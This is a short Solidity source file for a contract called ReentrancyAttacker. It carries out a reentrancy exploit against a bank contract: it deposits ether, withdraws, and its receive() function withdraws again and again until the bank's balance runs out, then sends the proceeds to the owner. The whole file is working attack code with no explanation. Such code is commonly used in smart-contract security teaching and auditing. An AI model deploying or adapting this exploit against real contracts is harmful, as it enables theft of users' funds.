// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function withdraw(uint256) external;
    function deposit() external payable;
}

contract ReentrancyAttacker {
    IVulnerableBank public bank;
    address public owner;
    uint256 public targetAmount;

    constructor(address _bank) {
        bank = IVulnerableBank(_bank);
        owner = msg.sender;
    }

    function attack(uint256 _amount) external payable {
        require(msg.value >= _amount, "Need ETH to deposit");
        targetAmount = _amount;
        bank.deposit{value: _amount}();
        bank.withdraw(_amount);
    }

    receive() external payable {
        if (address(bank).balance >= targetAmount) {
            bank.withdraw(targetAmount);
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}